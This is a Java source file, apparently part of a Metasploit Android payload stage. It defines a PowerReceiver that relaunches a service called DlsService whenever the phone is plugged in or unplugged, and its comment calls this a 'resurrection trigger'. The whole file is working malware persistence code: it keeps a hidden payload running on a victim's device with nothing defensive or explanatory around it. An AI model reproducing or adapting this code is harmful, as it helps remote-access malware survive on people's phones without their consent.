package com.metasploit.stage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * POWER_CONNECTED + POWER_DISCONNECTED receiver.
 * Power events indicate the device is being interacted with (plugged in).
 * Good resurrection trigger — phone is charging = likely staying on.
 */
public class PowerReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String a = intent.getAction();
        if (a == null) return;
        if (!Intent.ACTION_POWER_CONNECTED.equals(a)
            && !Intent.ACTION_POWER_DISCONNECTED.equals(a)) {
            return;
        }
        launch(context);
    }

    static void launch(Context ctx) {
        Intent svc = new Intent(ctx, DlsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(svc);
        } else {
            ctx.startService(svc);
        }
    }
}
